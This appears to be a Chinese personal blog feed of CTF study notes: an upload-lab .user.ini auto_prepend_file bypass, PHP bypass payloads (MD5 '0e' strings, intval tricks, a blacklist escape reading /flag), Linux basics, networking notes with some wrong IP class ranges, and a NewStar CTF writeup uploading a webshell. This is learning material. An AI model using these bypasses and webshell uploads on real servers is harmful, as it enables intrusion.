class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题对后缀过滤非常严格,但是没过滤.ini且提示后台存在一个php文件,这样我们就可以用.user.ini绕过</p><p>因为想要引发 .user.ini 解析漏洞需要三个前提条件</p><ol><li><p>服务器脚本语言为PHP  </p></li><li><p>服务器使用CGI／FastCGI模式  </p></li><li><p>上传目录下要有可执行的php文件</p></li></ol><p>而正好这道题后台存在一个php文件</p><p>那么我们写一个这样的.user.ini文件并上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = ytm666.jpg</span><br></pre></td></tr></table></figure><p>.user.ini文件里的意思是：所有的php文件都自动包含ytm666.jpg文件。.user.ini相当于一个用户自定义的php.ini</p><p>那么我们传入一个一句话木马并改后缀为jpg的文件,就可以通过.user.ini文件,利用后台存在的php文件使这个.jpg的shell文件直接执行</p>]]></content>
      
      
      <categories>
          
          <category> 周记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 周记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>培训笔记1</title>
      <link href="/2023/10/14/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-10-14-%E7%AC%94%E8%AE%B01/"/>
      <url>/2023/10/14/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-10-14-%E7%AC%94%E8%AE%B01/</url>
      
        <content type="html"><![CDATA[<h2 id="笔记1"><a href="#笔记1" class="headerlink" title="笔记1"></a>笔记1</h2><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>不同的数据类型只区别于占据的内存空间,而不同的占据空间会影响在计算机内开辟的内存区域,作为计算机,通过读取不同内存部分的地址来使用数据</p><p>而数据类型,就如同服务员来敲开不同门牌号(地址)的房间(内存)来拿取数据,不同的数据类型也就对应着不同数量的服务员</p><p>对于不同的数据传输,计算机和计算机,计算机和人之间如何”交流”,是通过人为规定的编码与数据对应的表来进行数据传输,从最早的ASCII表到如今的utf-8编码,一切存在世界上的文字与字符甚至表情、语言或是图片,都有对应规定的计算机编码格式,从而转换为二进制使计算机进行存储或传输数据</p><h3 id="计算机网络基础"><a href="#计算机网络基础" class="headerlink" title="计算机网络基础"></a>计算机网络基础</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/9b0e259a058e1e338ab3e50e728a2156.png" alt="1"></p><p>类似于从包装快递到送快递已经拆封的过程</p><p>从上层协议到底层协议后不同区域交流后再进行同样的逆过程</p><h4 id="ip地址"><a href="#ip地址" class="headerlink" title="ip地址"></a>ip地址</h4><p>ip地址是32位，每个字节8位，实质我们的划分就是简单的哪几个字节是网络标识，哪个是主机标识，a类就是第一个字节作为网络标识，后三个字节是主机表示。它的范围是0.0.0.0-127.0.0.0。b类前两个是网络表识别。它的范围是128.0.0.1-191.255.0.0。c类前三个是网络标识。它的范围是192.168.0.0-239.255.255.0。同理可得最后d类就是四个字节是网络标识。</p><p>还有一点就是需要注意一点，那就是表示主机地址时，不可以全为0或者全为1。全为0只有在表示对应的网络地址或IP地址不可知的情况下才使用。而全为1的主机地址一般作为广播地址。所以上面abc三类的主机地址上限算的时候都会减2。</p><h4 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h4><p>子网掩码是一个32位地址，这是一种与ip地址结合使用的技术。他有两个主要功能。一个是屏蔽ip地址的一部分，以区分网络id和主机id，并指示ip地址实在局域网上还是在远程网络上。第二个功能是将大型ip网络划分为若干个小型子网</p><p>子网的使用其实是为了减少IP的浪费，我们创建了许多网络，但有很多ip地址并没有用完，因此必须划分子网，以提高网络应用程序的效率。</p><p>在实际使用中，子网掩码是不能单独存在的，他必须结合ip地址一起使用。简单说的话，他就是用来分割子网和区分哪些ip是同一个网段的，哪些不是</p><p>比如ip地址：192.168.1.1 子网掩码：255.255.255.0</p><h3 id="计算思维"><a href="#计算思维" class="headerlink" title="计算思维"></a>计算思维</h3><p>问题分解与抽象化：计算思维鼓励将复杂问题分解成更小的、可管理的部分，同时抽象问题的关键方面。这有助于更好地理解问题的本质，使问题更容易解决。</p><p>算法设计：计算思维强调开发明确的、可执行的步骤序列，用于解决各种问题。这些步骤被称为算法，它们应该具有清晰的逻辑和正确性，以及高效性。</p><p>数据处理和分析：计算思维包括了处理和分析数据的能力，这包括数据的采集、整理、存储、分析和可视化。数据在许多领域中都是重要的资源。</p><p>模型建立：计算思维通常涉及将数学模型应用于现实世界问题。这些模型可以用来描述和解释现象，然后使用计算机进行模拟和分析。</p><p>计算机科学概念：计算思维需要了解计算机科学的基本概念，如数据结构、算法复杂性、编程语言等。这有助于更好地理解计算机工作的原理。创新和解决问题：计算思维培养了创新和解决问题的能力。它鼓励人们寻找新的方法来解决各种挑战，包括工程、科学研究、商业和社会问题。</p><p>按照计算机规范思维</p><h3 id="思维和心理"><a href="#思维和心理" class="headerlink" title="思维和心理"></a>思维和心理</h3>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>周记1-MD5,初级绕过,Liunx基本,php反序列化</title>
      <link href="/2023/10/07/%E5%91%A8%E8%AE%B0-2023-10-7-%E5%91%A8%E8%AE%B01/"/>
      <url>/2023/10/07/%E5%91%A8%E8%AE%B0-2023-10-7-%E5%91%A8%E8%AE%B01/</url>
      
        <content type="html"><![CDATA[<h2 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h2><p>例如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">substr</span>(<span class="variable">$password</span>,<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&quot;c4d038&quot;</span>;</span><br></pre></td></tr></table></figure><p>对于这样的问题,传入的password值为多少才能使代码成立呢<br>这种就可以考虑写一个简单的Python脚本来实现md5弱碰撞(因为md5不可反向解码,实际是需要一个个试出来答案的),可以先从数字试起</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack</span>(<span class="params">pre</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">999999</span>):</span><br><span class="line">       <span class="keyword">if</span> (hashlib.md5(<span class="built_in">str</span>(i).encode(<span class="string">&quot;UTF-8&quot;</span>)).hexdigest())[<span class="number">0</span>:<span class="number">6</span>] == <span class="built_in">str</span>(pre):</span><br><span class="line">           <span class="built_in">print</span>(i)</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">crack(<span class="string">&quot;c4d038&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行后发现得出结果为114514</p><h2 id="php的一些初级绕过"><a href="#php的一些初级绕过" class="headerlink" title="php的一些初级绕过"></a>php的一些初级绕过</h2><h3 id="md5弱类型绕过"><a href="#md5弱类型绕过" class="headerlink" title="md5弱类型绕过"></a>md5弱类型绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)</span><br></pre></td></tr></table></figure><p>例如对于这样的a和b,我们可以选择传入数组绕过,但如果不允许传数组,可以选择找出两个数再md5加密后都为0e开头的即可(这样会被识别为科学记数法进而都得0)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br></pre></td></tr></table></figure><p>所以构造a&#x3D;QNKCDZO&amp;b&#x3D;s878926199a即可绕过</p><h3 id="is-numeric-和intval-绕过"><a href="#is-numeric-和intval-绕过" class="headerlink" title="is_numeric()和intval()绕过"></a>is_numeric()和intval()绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>] &gt; <span class="number">2023</span></span><br></pre></td></tr></table></figure><p>例如这样的key5,我们可以选择传数组利用php中数组类型比整形大的特点绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$c</span>) &amp;&amp; <span class="variable">$c</span> != <span class="number">1024</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$c</span>) == <span class="number">1024</span></span><br></pre></td></tr></table></figure><p>但对于这样的题里面的c就不能传数组,因为要求intval($c)等于一个整数,那么我们可以选择构造c&#x3D;1024.5a这样的payload(利用此函数舍弃小数点部分的特性)</p><p>也可以选择传入一个0x开头的字符串,因为php中intval()函数中如果字符串包括了 “0x” (或 “0X”) 的前缀,使用 16 进制 (hex)</p><h3 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="variable">$code</span>)</span><br></pre></td></tr></table></figure><p>对于这样简单的黑名单过滤,可以选择参数逃逸绕过,构造这样的payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]));&amp;a=/flag</span><br></pre></td></tr></table></figure><p>其中的var_dump()是为了让网页回显</p><p>此外还可以使用变量拼接的方法</p><h3 id="strcmp-绕过"><a href="#strcmp-绕过" class="headerlink" title="strcmp()绕过"></a>strcmp()绕过</h3><p>此函数无法比较数组可以考虑传数组绕过</p><h2 id="Liunx常用命令"><a href="#Liunx常用命令" class="headerlink" title="Liunx常用命令"></a>Liunx常用命令</h2><h3 id="操作命令"><a href="#操作命令" class="headerlink" title="操作命令"></a>操作命令</h3><p><strong>1</strong>.<br>ls命令是列出目录内容的意思（List Directtory Contents）。运行它就是列出文件夹的内容，可能是文件也可能是文件夹。</p><p>  ls -l命令以详情模式(long listing fashion)列出文件夹的内容。</p><p>  ls -a命令会列出文件夹里的所有内容，包括以”.”开头的隐藏文件。</p><p>  注意：在Linux中，文件以“.”开头就是隐藏文件，并且每个文件，文件夹，设备或者命令都是以文件对待。<br><strong>2</strong>.<br>pwd 显示工作路径<br><strong>3</strong>.<br>cd &#x2F;home 进入 ‘&#x2F; home’ 目录’<br>cd … 返回上一级目录<br>cd …&#x2F;… 返回上两级目录<br>cd 进入个人的主目录<br>cd ~user1 进入个人的主目录<br>cd - 返回上次所在的目录</p><h3 id="文件显示命令"><a href="#文件显示命令" class="headerlink" title="文件显示命令"></a>文件显示命令</h3><p><strong>1</strong>.<br>less：显示文件内容带分页；<br><strong>2</strong>.<br>  grep：在文件中查询内容，grep –n “查找内容” 文件名；</p><p>  | [管道命令]：在linux和unix系统中 | 就是管道命令，把上一个命令的结果交给 | 的后面的命令进行处理。</p><p>  例：grep –n “查找内容” 文件名 | more<br><strong>3</strong>.<br>  cat：把文件串连接后输出到屏幕或加 &gt; fileName 到另一个档案。<br><strong>4</strong>.<br>  head：格式：head [-n|c num]fileName，说明：显示文件头部内容。没有参数时，显示最前10行。<br><strong>5</strong>.<br>  tail：格式：tail [-n|c num]fileName，说明：显示文件尾部内容。没有参数时，显示最后10行。<br><strong>6</strong>.<br>  cut：格式：cut -cnum1-num2 filename，说明：显示每行从开头算起第 num1 到 num2 的字符。</p><h2 id="Liunx基础"><a href="#Liunx基础" class="headerlink" title="Liunx基础"></a>Liunx基础</h2><h3 id="二级目录"><a href="#二级目录" class="headerlink" title="二级目录"></a>二级目录</h3><p>&#x2F;bin</p><p>放置的是在单人维护模式下还能够被操作的指令，在&#x2F;bin目录的指令可以被root与一般账号所使用<br>&#x2F;boot</p><p>这个目录主要放置开机会用到的文件，包括linux核心文件以及开机选单与开机所需配置文件等。<br>&#x2F;dev</p><p>在Linux系统上，任何装置与设备的接口设备都是以文件的形态存在于这个目录当中的。<br>&#x2F;etc</p><p>系统的主要配置文件几乎都是放置在这个目录下，列如账号密码文件，各种服务的启始党等。<br>&#x2F;home</p><p>这是系统默认的用户家目录<br>&#x2F;lib</p><p>库文件目录<br>&#x2F;media</p><p>&#x2F;media目录底下放置的是可移除的装置，包括软盘光盘等<br>&#x2F;opt</p><p>给第三方协力软件放置的目录。<br>&#x2F;root</p><p>系统管理员的家目录<br>&#x2F;sbin</p><p>为开机过程所需要的，里面包括了开机，修复，还原系统所需要的指令。<br>&#x2F;srv</p><p>srv可以视为service的缩写，是一些网络服务启动之后，这些服务所需要取用的数据目录。</p><h3 id="三级目录"><a href="#三级目录" class="headerlink" title="三级目录"></a>三级目录</h3><p>&#x2F;usr&#x2F;lib<br>包含各应用软件的函式库、目标文件(object file)，以及不被一般使用者惯用的执行档或脚本(script)。</p><p>&#x2F;usr&#x2F;local<br>系统管理员在本机自行安装自己下载的软件(ldistribution默认提供者)，建议安装到此目录，这样会比较便于管理。</p><p>&#x2F;var&#x2F;lib<br>程序本身执行的过程中，需要使用到的数据文件放置的目录</p><p>&#x2F;var&#x2F;log(重要)<br>登录文件放置的目录,里面比较重要的文件如&#x2F;var&#x2F;log&#x2F;messages,&#x2F;var&#x2F;log&#x2F;wtmp(记录登入者的信息)等。</p><p>&#x2F;etc&#x2F;init.d&#x2F;<br>所有服务的预设启动 script 都是放在这里的</p><p>&#x2F;etc&#x2F;passwd</p><h2 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h2><p>这个博客写的还不错<a href="https://blog.csdn.net/Hardworking666/article/details/122373938">https://blog.csdn.net/Hardworking666/article/details/122373938</a><br>再推荐一下这个视频里类和对象讲的很清楚(当复习一遍了)<a href="https://www.bilibili.com/video/BV1TH4y1U7tJ?p=5&amp;vd_source=aa13d69224a955c223f4998b491b80fb">https://www.bilibili.com/video/BV1TH4y1U7tJ?p=5&amp;vd_source=aa13d69224a955c223f4998b491b80fb</a></p>]]></content>
      
      
      <categories>
          
          <category> 周记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 周记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStar CTF web1</title>
      <link href="/2023/09/27/NewStar-CTF-2023-9-27-NewStar-CTF-web1/"/>
      <url>/2023/09/27/NewStar-CTF-2023-9-27-NewStar-CTF-web1/</url>
      
        <content type="html"><![CDATA[<h1 id="NewStar-CTF-web-第一周writeup"><a href="#NewStar-CTF-web-第一周writeup" class="headerlink" title="NewStar CTF web 第一周writeup"></a>NewStar CTF web 第一周writeup</h1><h2 id="泄露的秘密"><a href="#泄露的秘密" class="headerlink" title="泄露的秘密"></a>泄露的秘密</h2><p><img src="https://s2.loli.net/2023/10/01/oXic4WZ8fhR1Q7N.png" alt="1"><br>根据题目和网页的提示,认定这是一道藏有敏感文件的题,第一时间我想到的是爆破路径,但是很不巧,我没安dirseach,自己的路径扫描工具还出了问题..<br>我就打算尝试几个可能藏有敏感文件的路径,发现&#x2F;robots.txt里有一部分flag<br><img src="https://s2.loli.net/2023/10/01/yuxcONY3pQviMIZ.png" alt="1"><br>好,但是只出来了这一半,果不其然的卡关了,但是在刚才的尝试中发现了一个&#x2F;index.php路径有点特殊,据我发现网页是存在这个路径的但是显示不出来这个文件,所以通过网上的搜索,终于发现一种能下出敏感文件的路径&#x2F;<a href="http://www.zip/">www.zip</a><br><img src="https://s2.loli.net/2023/10/01/q3aXopFiYd1vLyn.png" alt="1"><br><img src="https://s2.loli.net/2023/10/01/BysdUGORo8APwI9.png" alt="1"><br>好好好还真藏在这里了,这下另一半flag也找到了,拼接一下提交这样就成功拿下第一道了</p><h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p><img src="https://s2.loli.net/2023/10/01/ZNRz39BTIXCEoik.png" alt="1"><br>经典文件上传,那么先尝试一句话木马直接上传<br><img src="https://s2.loli.net/2023/10/01/ol5xHiSb1XVwstn.png" alt="1"><br><img src="https://s2.loli.net/2023/10/01/Pz6LXqfugHVcWmS.png" alt="1"><br>上传后发现网页过滤格式,那么我采取改成合法后缀上传后抓包再改包的这种方法植入后门<br>那么接下来改好后缀上传,直接用burpsuite抓取这个数据包<br><img src="https://s2.loli.net/2023/10/01/OpfelavXB5r1Yzn.png" alt="1"><br>此时上传就成功了,也从burpsuite内抓到了数据包<br><img src="https://s2.loli.net/2023/10/01/7ilReQJprIZy5f6.png" alt="1"><br>那么这时将这里的后缀改成php,再发回给服务器,这个木马就生效了<br><img src="https://s2.loli.net/2023/10/01/ueyiL9S78NkUXoR.png" alt="1"><br>好,这样就可以用webshell操作了,这里我用中国蚁剑操作一下<br><img src="https://s2.loli.net/2023/10/01/UCYgaBGstxfE2Ah.png" alt="1"><br>ok确认植入成功了,我们的这个木马文件也能看到在里面了,这样就可以去翻看这个服务器的各种文件了,在这之间应该就能找到本题藏有flag的文件<br><img src="https://s2.loli.net/2023/10/01/ITj5oaCKFJg3crf.png" alt="1"><br>找到了,打开这个文件看看就是答案了<br><img src="https://s2.loli.net/2023/10/01/Babp5ygEOMi6UPq.png" alt="1"></p><h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><p><img src="https://s2.loli.net/2023/10/01/XO6Yu5DkE8cRGj1.png" alt="1"><br>映入眼帘的就是传get参数,估计后面也会有post请求,那么我直接用hackbar来做了<br><img src="https://s2.loli.net/2023/10/01/3Xfe6si98MaEhov.png" alt="1"><br>果然下一步就是传post参数,但是需要找一找secret的值<br><img src="https://s2.loli.net/2023/10/01/gxBGPLs3EuvOAUy.png" alt="1"><br>从网页源码翻翻就找到了,base64解个码传上去<br><img src="https://s2.loli.net/2023/10/01/vl8CdaHPknuz5gt.png" alt="1"><br>ok传好值了,接下来看看请求头部分有没有信息吧<br><img src="https://s2.loli.net/2023/10/01/p9RZ3f8aeEJqH15.png" alt="1"><br>发现cookie部分有题目要求的验证内容,将其改成ctfer<br><img src="https://s2.loli.net/2023/10/01/xuUStgeFZ3NQwO7.png" alt="1"><br>成功,又是一关,依旧是改请求头部分,这次因为是浏览器指定要求,那么就修改User Agent部分为题目要求<br><img src="https://s2.loli.net/2023/10/01/gPBUu2vTrxQ8RoG.png" alt="1"><br>好了又是经典改请求头,这次是修改referer部分<br><img src="https://s2.loli.net/2023/10/01/ZvuChPbkrydGEs5.png" alt="1"><br>终于到最后了,也是经典套路本地访问,经过多次尝试试出了是哪条语句生效<br><img src="https://s2.loli.net/2023/10/01/BskA2rYRNiSVq3j.png" alt="1"><br>为了方便一次性尝试我用的burpsuite抓包一次性都写进去发包,但是坐大牢了,整了半天发现最后是X-real-IP这条语句才能生效,不过最后也是成功了<br>那么这次就用hackbar演示一下结果吧<br><img src="https://s2.loli.net/2023/10/01/lKCOuchso8JQIbY.png" alt="1"><br>PS: 最后一部分通过和我亲爱的蓝学长讨论,得知到更简单的伪造ip方法在此致谢此大佬</p><h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><p><img src="https://s2.loli.net/2023/10/01/eFNwvEpmSZ2WcTf.png" alt="1"><br>开局看到这个提示一时间想到传参,但不清楚Flask是什么东西,通过查阅得知Flask是一个网页的框架,也是可以接收正常请求的<br>我尝试着传了这两个指定的参数<br><img src="https://s2.loli.net/2023/10/01/rdVfzQHpY5Ui8gE.png" alt="1"><br>发现出现这样的提示,得知flag就在源码中,但Flask框架的源码目前不清楚怎么查看,我又进行了几次尝试<br>此时发现如果传入的不是数字就会有这样的页面<br><img src="https://s2.loli.net/2023/10/01/bPcDzuXOjKh1Yn2.png" alt="1"><br>当时对这个界面确实匪夷所思,一直想着是不是还是对参数的改变才能得出答案,但是仔细一想这题的主要内容是Flask,经过长时间的周转我打算仔细看看这个显示出来的界面<br>结果细看发现这不就是源码吗..通过翻找就找到了flag<br><img src="https://s2.loli.net/2023/10/01/QTWLrlh1FBG6JxK.png" alt="1"><br>(这题确实没想到这么简单,之前和贺同学交流得知如果是ssti漏洞就会难不少)</p><h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><p><img src="https://s2.loli.net/2023/10/01/worm4qKu5RAx7JD.png" alt="1"><br>翻翻这道题,发现是有五层保护,需要一层一层绕过<br>那么先来到第一层,要求key1和key2不同但md5加密后相同,那就根据md5加密的机制传两个不一样的数组<br><img src="https://s2.loli.net/2023/10/01/dAv3YqSWOTVsnZ8.png" alt="1"><br>如图,第一层就过了<br>第二层是传个post参数经过md5加密和sha1加密后强相等才能通过,那就再传个数组呗<br><img src="https://s2.loli.net/2023/10/01/VindBhLTReYN2P9.png" alt="1"><br>好也过了<br><img src="https://s2.loli.net/2023/10/01/MhKFgRYa8Eu5jxQ.png" alt="1"><br>到第三层了,发现是一个字符比较,但strcmp()函数无法比较数组,所以我继续传个数组<br><img src="https://s2.loli.net/2023/10/01/OPqmvW4wUrHanlT.png" alt="1"><br>果然过了,接下来看看第四层吧<br><img src="https://s2.loli.net/2023/10/01/5DFvHbstpLX1d3V.png" alt="1"><br>第四层发现不能传数字并且值要大于2023,那可以利用php中数组类型一定比整数类型大的特点,我们随便传上一个数组<br><img src="https://s2.loli.net/2023/10/01/C6L85GZiDcfOEAR.png" alt="1"><br>第四层就过了,看看第五层是什么成分<br><img src="https://s2.loli.net/2023/10/01/zaP3JMmIbsOgQXk.png" alt="1"><br>仔细看看,发现这个flag5需要自己传,而且根据前两句函数发现传的post数组中的值和键会被取出当成单独的值,并将这些值和其他post传的参赋给var,之后根据这个正则表达式过滤一切字母和数字<br>那么我们之前传的post参数key3数组里就不能有数字,且之后传的flag5里也不能有数字<br>这样我们可以给key3数组赋任意的符号来绕过这个正则并且第二层的通过也不会失效(因为依旧是数组),而flag5可以考虑通过构造flag5&#x3D;’ ‘这样的payload来绕过正则,且这样的表示也为真,这样if语句执行,flag就展现在眼前了<br><img src="https://s2.loli.net/2023/10/01/9hG3SpflDjHks4E.png" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>序言</title>
      <link href="/2023/08/25/2023-8-25-%E5%BA%8F%E8%A8%80/"/>
